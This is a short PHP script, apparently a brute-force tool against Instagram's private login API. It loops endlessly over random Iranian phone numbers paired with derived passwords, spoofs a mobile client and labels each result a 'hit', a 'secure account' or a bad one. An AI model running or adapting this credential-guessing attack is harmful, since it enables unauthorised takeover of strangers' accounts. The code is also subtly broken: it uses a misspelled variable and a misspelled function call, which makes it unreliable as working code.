<?php
function check($user,$pass){
$login = curl_init();
$headers = array(
    'User-Agent: Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
);
$data = array(
    '_uuid' => "e62e1440-4707-11ec-bac0-dbaa51f8f63b",
    'password' => $pass,
    'username'=> $user,
    'device_id' => "e62e1440-4707-11ec-bac0-dbaa51f8f63b",
    'from_reg'=> 'false',
    '_csrftoken'=> 'missing',
    'login_attempt_count' => '0'
);
curl_setopt($login,CURLOPT_URL,"https://i.instagram.com/api/v1/accounts/login/");
curl_setopt($login , CURLOPT_FOLLOWLOCATION , true);
curl_setopt($login , CURLOPT_POST , 1);
curl_setopt($login,CURLOPT_HTTPHEADER,$headers);
curl_setopt($login,CURLOPT_POSTFIELDS,$data);
curl_setopt($login , CURLOPT_RETURNTRANSFER , true);
$respone = curl_exec($login);
return $respone;
}
while(True){
$combo = substr(str_shuffle('1234567890'),0,7);
$users = "+98913$combo";
$pass = "0913$combo";
$check = check($user,$pass);
if(strops($check,'logged_in_user')){
echo "New Hit $user:$pass";
} elseif(strpos($check,'challenge_required')){
echo "Secure Account $user:$pass";
} else {
echo "Bad Account $user:$pass";
}
}
